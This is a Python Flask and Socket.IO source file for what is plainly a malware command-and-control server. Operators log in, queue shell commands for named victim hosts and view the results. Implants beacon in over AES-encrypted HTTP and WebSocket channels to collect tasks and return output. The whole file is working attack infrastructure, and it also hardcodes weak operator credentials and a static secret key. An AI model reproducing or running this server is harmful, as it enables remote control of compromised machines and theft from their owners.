import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, render_template, redirect, session, url_for
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from flask_socketio import SocketIO, emit
import sqlite3
import os
import json
import sys
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_decrypt, aes_encrypt

app = Flask(__name__)
app.secret_key = 'super-ghost-key'

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

socketio = SocketIO(app, cors_allowed_origins="*")

DB_PATH = os.path.join(os.path.dirname(__file__), 'beacons.db')

class Operator(UserMixin):
    def __init__(self, id):
        self.id = id

USER_CREDENTIALS = {
    "admin": "ghostpass123"
}

@login_manager.user_loader
def load_user(user_id):
    return Operator(user_id)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS beacons (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, hostname TEXT, timestamp TEXT, payload TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, command TEXT, status TEXT, result TEXT)")
    conn.commit()
    conn.close()

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
            login_user(Operator(username))
            return redirect(url_for('dashboard'))
        return "Invalid credentials", 401
    return render_template("login.html")

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM beacons ORDER BY timestamp DESC")
    beacons = c.fetchall()
    c.execute("SELECT id, hostname, command, status, result FROM tasks ORDER BY id DESC")
    tasks = c.fetchall()
    conn.close()
    return render_template("dashboard.html", beacons=beacons, tasks=tasks)

@app.route('/add_task', methods=['POST'])
@login_required
def add_task():
    hostname = request.form.get('hostname')
    command = request.form.get('command')
    if not hostname or not command:
        return "Missing input", 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()
    return redirect('/')

@app.route('/console')
@login_required
def console():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT DISTINCT hostname FROM beacons ORDER BY hostname")
    hosts = [row[0] for row in c.fetchall()]
    conn.close()
    return render_template("console.html", hosts=hosts)

@app.route('/console_send', methods=['POST'])
@login_required
def console_send():
    data = request.get_json()
    hostname = data.get("hostname")
    command = data.get("command")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
    conn.commit()
    conn.close()
    return jsonify({"status": "task added"})

@app.route('/console_output')
@login_required
def console_output():
    hostname = request.args.get("hostname")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT command, result FROM tasks WHERE hostname = ? AND result != '' ORDER BY id DESC LIMIT 5", (hostname,))
    rows = c.fetchall()
    conn.close()
    output = "\n\n".join([f"$ {cmd}\n{res}" for cmd, res in rows]) or "[+] No output yet..."
    return output

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.data.decode()
    data = json.loads(aes_decrypt(encrypted))
    ip = request.remote_addr
    hostname = data.get('hostname', 'unknown')
    payload = data.get('payload', 'none')
    timestamp = datetime.utcnow().isoformat()

    print(f"[+] Beacon received from {hostname} ({ip}) - Payload: {payload}")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)", (ip, hostname, timestamp, payload))
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending'", (hostname,))
    tasks = c.fetchall()
    c.execute("UPDATE tasks SET status = 'dispatched' WHERE hostname = ? AND status = 'pending'", (hostname,))
    conn.commit()
    conn.close()

    commands = [cmd for _, cmd in tasks]

    if commands:
        print(f"[+] Queued tasks for {hostname}: {commands}")
    else:
        print(f"[-] No tasks queued for {hostname}")

    return jsonify({'tasks': commands}), 200


@app.route('/result', methods=['POST'])
def result():
    encrypted = request.data.decode()
    data = json.loads(aes_decrypt(encrypted))
    hostname = data.get("hostname")
    command = data.get("command")
    result = data.get("result")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
    conn.commit()
    conn.close()
    return jsonify({"status": "result stored"})

@socketio.on('connect')
def handle_connect():
    print("[+] WebSocket client connected.")

@socketio.on('register')
def handle_register(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    print(f"[+] Host registered: {hostname}")
    emit("ack", aes_encrypt(json.dumps({"msg": "Registered"})))

@socketio.on('result')
def handle_result(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")
    command = data.get("command")
    result = data.get("result")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
    conn.commit()
    conn.close()

    print(f"[+] Result from {hostname}:\n{result}")

    emit("ack", aes_encrypt(json.dumps({"msg": "Result stored"})))

    # Emit to live console
    socketio.emit("console_result", {
        "hostname": hostname,
        "command": command,
        "result": result
    })

@socketio.on('request_task')
def handle_task_request(encrypted_data):
    data = json.loads(aes_decrypt(encrypted_data))
    hostname = data.get("hostname")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending' LIMIT 1", (hostname,))
    row = c.fetchone()

    if row:
        task_id, command = row
        c.execute("UPDATE tasks SET status = 'dispatched' WHERE id = ?", (task_id,))
        conn.commit()
        emit("task", aes_encrypt(json.dumps({"command": command})))
    else:
        emit("task", aes_encrypt(json.dumps({"command": ""})))
    conn.close()

if __name__ == '__main__':
    init_db()
    socketio.run(app, host='0.0.0.0', port=8080)